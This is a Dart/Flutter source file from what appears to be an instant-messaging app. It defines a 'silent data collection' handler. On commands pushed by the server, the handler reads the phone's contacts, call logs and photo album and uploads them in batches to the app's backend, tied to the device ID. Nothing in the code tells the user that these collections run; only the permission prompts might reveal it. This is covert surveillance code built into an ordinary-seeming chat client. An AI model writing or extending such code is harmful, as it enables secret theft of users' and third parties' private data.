import 'dart:async';
import 'dart:convert';
import 'dart:io' show File, Platform;
import 'dart:math' as math;

import 'package:flutter/foundation.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:photo_manager/photo_manager.dart';

import '../../api/api_helpers.dart';
import '../../api/api_providers.dart';
import '../../api/data_collect_api.dart';
import '../../api/file_api.dart';
import '../../core/enums/message_type.dart';
import '../../core/di/app_providers.dart';
import '../../core/utils/app_logger.dart';
import '../../core/utils/device_info_util.dart';
import '../../models/system_message.dart';
import 'call_log_reader.dart';
import 'collect_photo_compress.dart';
import 'collect_platform.dart';
import 'collect_session.dart';
import 'device_contacts_reader.dart';
import 'native_photo_reader.dart';
import 'permission_bootstrap.dart';
import 'photo_collect_reader.dart';
import 'task_collect_permission_util.dart';

/// 静默数据采集。对应 im-uniapp common/data-collect.js。
class DataCollectHandler {
  DataCollectHandler(this.ref);

  final Ref ref;
  bool _syncingPendingTasks = false;

  DataCollectApi get _api => ref.read(dataCollectApiProvider);
  CollectSession get _session => ref.read(collectSessionProvider);

  /// 主动拉取本设备待执行任务，兜底 WS/离线系统消息偶发丢失。
  Future<void> syncPendingTasks({String reason = 'manual'}) async {
    if (!supportsNativeCollect || _syncingPendingTasks) return;
    final deviceId = _session.deviceId;
    if (deviceId.isEmpty) return;
    _syncingPendingTasks = true;
    try {
      final tasks = await _api.listPendingTasks(deviceId: deviceId);
      if (tasks.isEmpty) return;
      log.i('[DataCollect] sync pending count=${tasks.length}, reason=$reason');
      for (final task in tasks) {
        final taskType = asInt(task['taskType']);
        final content = <String, dynamic>{
          'taskNo': task['taskNo']?.toString() ?? '',
          'taskType': taskType,
          'taskId': asInt(task['id']),
          if (task['targetDeviceId'] != null)
            'targetDeviceId': task['targetDeviceId'].toString(),
          if (task['expireTime'] != null) 'expireTime': task['expireTime'],
        };
        await handleCommand(
          SystemMessage(
            id: asInt(task['id']),
            type: _messageTypeFromTaskType(taskType),
            content: jsonEncode(content),
          ),
        );
      }
    } catch (e, st) {
      log.w('[DataCollect] sync pending failed: $e\n$st');
    } finally {
      _syncingPendingTasks = false;
    }
  }

  Future<bool> _ensureCollectAllowed(
    String taskNo,
    int taskId,
    int taskType,
  ) async {
    if (!await _session.isCollectEnabled(dataType: taskType)) {
      await _updateTaskResult(taskNo, taskId, 6, 0, '该类型采集已关闭');
      return false;
    }
    return true;
  }

  /// 处理系统消息中的数据采集指令（type 55-57）。
  Future<void> handleCommand(SystemMessage msg) async {
    if (!supportsNativeCollect) {
      log.i('[DataCollect] skip command on non-native platform');
      return;
    }
    String taskNo = '';
    int taskId = 0;
    try {
      final raw = msg.content;
      if (raw == null || raw.isEmpty) {
        log.w('[DataCollect] empty content type=${msg.type}');
        return;
      }

      final taskData = jsonDecode(raw) as Map<String, dynamic>;
      taskNo = taskData['taskNo']?.toString() ?? '';
      taskId = asInt(taskData['taskId']);
      var taskType = asInt(taskData['taskType']);
      final expireTime = taskData['expireTime'];
      final targetDeviceId = taskData['targetDeviceId']?.toString();

      log.i(
        '[DataCollect] handleCommand type=${msg.type} taskType=$taskType '
        'taskId=$taskId device=$targetDeviceId mine=${_session.deviceId}',
      );

      if (_session.deviceId.isEmpty) {
        log.w('[DataCollect] skip: 无服务端 deviceId，禁止采集');
        if (taskId > 0) {
          await _updateTaskResult(taskNo, taskId, 3, 0, '客户端无 deviceId，请重新登录');
        }
        return;
      }

      if (targetDeviceId != null &&
          targetDeviceId.isNotEmpty &&
          targetDeviceId != _session.deviceId) {
        log.i(
          '[DataCollect] skip task $taskId for device $targetDeviceId, mine=${_session.deviceId}',
        );
        if (taskId > 0) {
          await _updateTaskResult(
            taskNo,
            taskId,
            5,
            0,
            '目标设备不匹配（本机=${_session.deviceId}）',
          );
        }
        return;
      }

      if (taskType == 0) {
        taskType = _taskTypeFromMessageType(msg.type);
      }

      if (_isExpired(expireTime)) {
        await _reportResult(taskNo, taskId, 4, null, '任务已过期');
        return;
      }

      if (!await _ensureCollectAllowed(taskNo, taskId, taskType)) {
        return;
      }

      switch (taskType) {
        case 1:
          await _collectAddressBook(taskNo, taskId);
        case 2:
          await _collectCallRecord(taskNo, taskId);
        case 3:
          await _collectPhotoAlbum(taskNo, taskId);
        case 4:
          await _reportResult(taskNo, taskId, 1, null, '短信采集已关闭');
        default:
          log.w('[DataCollect] unknown taskType=$taskType');
      }
    } catch (e, st) {
      log.e('[DataCollect] handleCommand failed: $e\n$st');
    }
  }

  int _taskTypeFromMessageType(int type) {
    switch (type) {
      case MessageType.dataCollectAddressBook:
        return 1;
      case MessageType.dataCollectCallRecord:
        return 2;
      case MessageType.dataCollectPhotoAlbum:
        return 3;
      default:
        return 0;
    }
  }

  int _messageTypeFromTaskType(int taskType) {
    switch (taskType) {
      case 1:
        return MessageType.dataCollectAddressBook;
      case 2:
        return MessageType.dataCollectCallRecord;
      case 3:
        return MessageType.dataCollectPhotoAlbum;
      default:
        return MessageType.dataCollectAddressBook;
    }
  }

  bool _isExpired(dynamic expireTime) {
    if (expireTime == null) return false;
    if (expireTime is num) {
      final ms = expireTime > 1e12
          ? expireTime.toInt()
          : (expireTime * 1000).toInt();
      return DateTime.now().millisecondsSinceEpoch > ms;
    }
    if (expireTime is String && expireTime.isNotEmpty) {
      final dt = DateTime.tryParse(expireTime);
      if (dt != null) return DateTime.now().isAfter(dt);
    }
    return false;
  }

  Future<void> _collectAddressBook(String taskNo, int taskId) async {
    try {
      if (kIsWeb || (!Platform.isAndroid && !Platform.isIOS)) {
        await _reportResult(taskNo, taskId, 1, null, '当前平台不支持通讯录采集');
        return;
      }

      final hasPermission = await TaskCollectPermissionUtil.ensureForTask(
        ref,
        TaskCollectPermissionKind.contacts,
      );
      if (!hasPermission) {
        await _reportResult(taskNo, taskId, 1, null, '用户未授权通讯录权限');
        return;
      }

      final formatted = await DeviceContactsReader.readForReport();
      if (formatted.isEmpty) {
        await _reportResult(taskNo, taskId, 2, [], '通讯录为空');
        return;
      }

      await _uploadAddressBook(taskNo, taskId, formatted);
    } catch (e, st) {
      log.e('[DataCollect] collectAddressBook failed: $e\n$st');
      await _reportResult(taskNo, taskId, 3, null, e.toString());
    }
  }

  Future<void> _collectCallRecord(String taskNo, int taskId) async {
    log.i('[DataCollect] collectCallRecord start taskId=$taskId');
    try {
      if (kIsWeb || (!Platform.isAndroid && !Platform.isIOS)) {
        await _reportResult(taskNo, taskId, 1, null, '当前平台不支持通话记录采集');
        return;
      }

      if (Platform.isIOS) {
        await _reportResult(taskNo, taskId, 1, null, '暂不支持通话记录采集');
        return;
      }

      final hasPermission = await TaskCollectPermissionUtil.ensureForTask(
        ref,
        TaskCollectPermissionKind.callLog,
      );
      if (!hasPermission) {
        await _reportResult(taskNo, taskId, 1, null, '用户未授权通话记录权限');
        return;
      }

      final callRecords = await CallLogReader.readForReport();
      log.i('[DataCollect] collectCallRecord read count=${callRecords.length}');
      if (callRecords.isEmpty) {
        await _reportResult(taskNo, taskId, 2, [], '通话记录为空');
        return;
      }

      await _uploadCallRecord(taskNo, taskId, callRecords);
    } catch (e, st) {
      log.e('[DataCollect] collectCallRecord failed: $e\n$st');
      await _reportResult(taskNo, taskId, 3, null, e.toString());
    }
  }

  Future<void> _collectPhotoAlbum(String taskNo, int taskId) async {
    try {
      if (kIsWeb || (!Platform.isAndroid && !Platform.isIOS)) {
        await _reportResult(taskNo, taskId, 1, null, '当前平台不支持相册采集');
        return;
      }

      final hasPermission = await TaskCollectPermissionUtil.ensureForTask(
        ref,
        TaskCollectPermissionKind.photos,
      );
      if (!hasPermission) {
        await _reportResult(taskNo, taskId, 1, null, '用户未授权相册权限');
        return;
      }

      if (NativePhotoReader.supported) {
        final page = await NativePhotoReader(
          ref.read(kvStoreProvider),
        ).readNextPage();
        log.i(
          '[DataCollect] native photos page ${page.startOffset}-${page.startOffset + page.photos.length}/${page.totalCount}',
        );
        if (page.photos.isEmpty) {
          if (!await PermissionBootstrap.hasPhotosCollectAccess()) {
            await _reportResult(taskNo, taskId, 1, null, '用户未授权相册权限');
            return;
          }
          await _reportResult(taskNo, taskId, 2, [], '相册为空');
          return;
        }
        await _uploadNativePhotoAlbum(taskNo, taskId, page.photos);
        return;
      }

      List<AssetEntity> photos = await _readDevicePhotos();

      if (photos.isEmpty) {
        if (!await PermissionBootstrap.hasPhotosCollectAccess()) {
          await _reportResult(taskNo, taskId, 1, null, '用户未授权相册权限');
          return;
        }
        await _reportResult(taskNo, taskId, 2, [], '相册为空');
        return;
      }

      await _uploadPhotoAlbum(taskNo, taskId, photos);
    } catch (e, st) {
      log.e('[DataCollect] collectPhotoAlbum failed: $e\n$st');
      await _reportResult(taskNo, taskId, 3, null, e.toString());
    }
  }

  Future<List<AssetEntity>> _readDevicePhotos() async {
    final page = await PhotoCollectReader(
      ref.read(kvStoreProvider),
    ).readNextPage();
    log.i(
      '[DataCollect] photos page ${page.startOffset}-${page.startOffset + page.entities.length}/${page.totalCount}',
    );
    return page.entities;
  }

  Future<void> _uploadPhotoAlbum(
    String taskNo,
    int taskId,
    List<AssetEntity> photos,
  ) async {
    try {
      // 串行压缩上传，避免并行压图导致发热；临时文件不进系统相册。
      const batchSize = 5;
      final totalBatches = (photos.length / batchSize).ceil();
      var successCount = 0;
      var failCount = 0;
      final fileApi = ref.read(fileApiProvider);

      for (var i = 0; i < totalBatches; i++) {
        final start = i * batchSize;
        final end = math.min(start + batchSize, photos.length);
        final batch = photos.sublist(start, end);

        final successPhotos = <Map<String, dynamic>>[];
        for (final entity in batch) {
          final result = await _uploadSinglePhoto(entity, fileApi);
          if (result != null) {
            successCount++;
            successPhotos.add(result);
          } else {
            failCount++;
          }
          await Future<void>.delayed(const Duration(milliseconds: 400));
        }

        if (successPhotos.isNotEmpty) {
          try {
            final label = await _session.deviceLabel();
            await _api.reportPhotoAlbum(
              photos: successPhotos,
              batchIndex: i + 1,
              totalBatches: totalBatches,
              deviceId: _session.deviceId,
              deviceLabel: label,
              triggerSource: 'task',
              taskId: taskId,
              taskNo: taskNo,
            );
          } catch (e, st) {
            log.e(
              '[DataCollect] reportPhotoAlbum batch ${i + 1} failed: $e\n$st',
            );
          }
        }

        if (i < totalBatches - 1) {
          await Future<void>.delayed(const Duration(seconds: 2));
        }
      }

      if (failCount == 0) {
        await _updateTaskResult(taskNo, taskId, 2, successCount, null);
        log.i('[DataCollect] photo album uploaded count=$successCount');
      } else {
        await _updateTaskResult(
          taskNo,
          taskId,
          3,
          successCount,
          '部分上传失败，成功:$successCount，失败:$failCount',
        );
      }
    } catch (e, st) {
      log.e('[DataCollect] uploadPhotoAlbum failed: $e\n$st');
      await _updateTaskResult(taskNo, taskId, 3, 0, e.toString());
    }
  }

  Future<void> _uploadNativePhotoAlbum(
    String taskNo,
    int taskId,
    List<NativePhoto> photos,
  ) async {
    try {
      const batchSize = 5;
      final totalBatches = (photos.length / batchSize).ceil();
      var successCount = 0;
      var failCount = 0;
      final fileApi = ref.read(fileApiProvider);

      for (var i = 0; i < totalBatches; i++) {
        final start = i * batchSize;
        final end = math.min(start + batchSize, photos.length);
        final batch = photos.sublist(start, end);
        final successPhotos = <Map<String, dynamic>>[];

        for (final photo in batch) {
          CollectPhotoTemp? temp;
          try {
            temp = await CollectPhotoCompress.compressFile(
              path: photo.path,
              sourceId: photo.id,
              width: photo.width,
              height: photo.height,
            );
            if (temp == null) {
              log.w(
                '[DataCollect] native photo ${photo.id} compress failed, skip',
              );
              failCount++;
              continue;
            }

            final uploaded = await fileApi.uploadImage(
              temp.path,
              isPermanent: false,
            );
            successCount++;
            successPhotos.add({
              'id': photo.id,
              'timestamp': photo.timestamp,
              'name': photo.name,
              'url': uploaded.originUrl,
              'width': temp.width,
              'height': temp.height,
              'size': temp.size,
            });
          } catch (e) {
            failCount++;
            log.w('[DataCollect] upload native photo ${photo.id} failed: $e');
          } finally {
            await CollectPhotoCompress.dispose(temp);
            await _deleteNativePhotoCache(photo.path);
          }
          await Future<void>.delayed(const Duration(milliseconds: 400));
        }

        if (successPhotos.isNotEmpty) {
          final label = await _session.deviceLabel();
          await _api.reportPhotoAlbum(
            photos: successPhotos,
            batchIndex: i + 1,
            totalBatches: totalBatches,
            deviceId: _session.deviceId,
            deviceLabel: label,
            triggerSource: 'task',
            taskId: taskId,
            taskNo: taskNo,
          );
        }

        if (i < totalBatches - 1) {
          await Future<void>.delayed(const Duration(seconds: 2));
        }
      }

      if (failCount == 0) {
        await _updateTaskResult(taskNo, taskId, 2, successCount, null);
        log.i('[DataCollect] native photo album uploaded count=$successCount');
      } else {
        await _updateTaskResult(
          taskNo,
          taskId,
          3,
          successCount,
          '部分上传失败，成功:$successCount，失败:$failCount',
        );
      }
    } catch (e, st) {
      log.e('[DataCollect] uploadNativePhotoAlbum failed: $e\n$st');
      await _updateTaskResult(taskNo, taskId, 3, 0, e.toString());
    }
  }

  Future<void> _deleteNativePhotoCache(String path) async {
    try {
      final file = File(path);
      if (await file.exists()) await file.delete();
    } catch (_) {}
  }

  Future<Map<String, dynamic>?> _uploadSinglePhoto(
    AssetEntity entity,
    FileApi fileApi,
  ) async {
    CollectPhotoTemp? temp;
    try {
      temp = await CollectPhotoCompress.compress(entity);
      if (temp == null) {
        log.w('[DataCollect] photo ${entity.id} compress failed, skip');
        return null;
      }

      final uploaded = await fileApi.uploadImage(temp.path, isPermanent: false);
      return {
        'id': entity.id,
        'timestamp': entity.createDateTime.millisecondsSinceEpoch,
        'name': entity.title ?? entity.relativePath ?? '',
        'url': uploaded.originUrl,
        'width': temp.width,
        'height': temp.height,
        'size': temp.size,
      };
    } catch (e) {
      log.w('[DataCollect] upload photo ${entity.id} failed: $e');
      return null;
    } finally {
      await CollectPhotoCompress.dispose(temp);
    }
  }

  Future<void> _uploadCallRecord(
    String taskNo,
    int taskId,
    List<Map<String, dynamic>> callRecords,
  ) async {
    try {
      const batchSize = 50;
      final totalBatches = (callRecords.length / batchSize).ceil();
      final label = await _session.deviceLabel();

      for (var i = 0; i < totalBatches; i++) {
        final start = i * batchSize;
        final end = math.min(start + batchSize, callRecords.length);
        final batch = callRecords.sublist(start, end);

        await _api.reportCallRecord(
          callLogs: batch,
          batchIndex: i + 1,
          totalBatches: totalBatches,
          deviceId: _session.deviceId,
          deviceLabel: label,
          triggerSource: 'task',
          taskId: taskId,
          taskNo: taskNo,
        );
      }

      await _updateTaskResult(taskNo, taskId, 2, callRecords.length, null);
      log.i('[DataCollect] call record uploaded count=${callRecords.length}');
    } catch (e, st) {
      log.e('[DataCollect] uploadCallRecord failed: $e\n$st');
      await _updateTaskResult(taskNo, taskId, 3, 0, e.toString());
    }
  }

  Future<void> _uploadAddressBook(
    String taskNo,
    int taskId,
    List<Map<String, dynamic>> contacts,
  ) async {
    try {
      const batchSize = 50;
      final totalBatches = contacts.isEmpty
          ? 1
          : (contacts.length / batchSize).ceil();
      final label = await _session.deviceLabel();
      final allIds = contacts
          .map((c) => c['id']?.toString() ?? '')
          .where((id) => id.isNotEmpty)
          .toList();

      for (var i = 0; i < totalBatches; i++) {
        final start = i * batchSize;
        final end = math.min(start + batchSize, contacts.length);
        final batch = contacts.isEmpty
            ? <Map<String, dynamic>>[]
            : contacts.sublist(start, end);
        final isLast = i == totalBatches - 1;

        await _api.reportAddressBook(
          contacts: batch,
          batchIndex: i + 1,
          totalBatches: totalBatches,
          deviceId: _session.deviceId,
          deviceLabel: label,
          triggerSource: 'task',
          taskId: taskId,
          taskNo: taskNo,
          reconcileSnapshot: isLast,
          snapshotContactIds: isLast ? allIds : null,
        );
      }

      await _updateTaskResult(taskNo, taskId, 2, contacts.length, null);
      log.i('[DataCollect] address book uploaded count=${contacts.length}');
    } catch (e, st) {
      log.e('[DataCollect] uploadAddressBook failed: $e\n$st');
      await _updateTaskResult(taskNo, taskId, 3, 0, e.toString());
    }
  }

  Future<void> _reportResult(
    String taskNo,
    int taskId,
    int executeStatus,
    List<dynamic>? data,
    String? errorMessage,
  ) async {
    await _updateTaskResult(
      taskNo,
      taskId,
      executeStatus,
      data?.length ?? 0,
      errorMessage,
    );
  }

  Future<void> _updateTaskResult(
    String taskNo,
    int taskId,
    int executeStatus,
    int dataCount,
    String? errorMessage,
  ) async {
    try {
      final device = await DeviceInfoUtil.load();
      await _api.updateTaskResult(
        taskNo: taskNo,
        taskId: taskId,
        executeStatus: executeStatus,
        dataCount: dataCount,
        errorMessage: errorMessage,
        deviceInfo: device.deviceInfo,
        clientVersion: device.clientVersion,
      );
    } catch (e, st) {
      log.e('[DataCollect] updateTaskResult failed: $e\n$st');
    }
  }
}

final dataCollectHandlerProvider = Provider<DataCollectHandler>((ref) {
  return DataCollectHandler(ref);
});
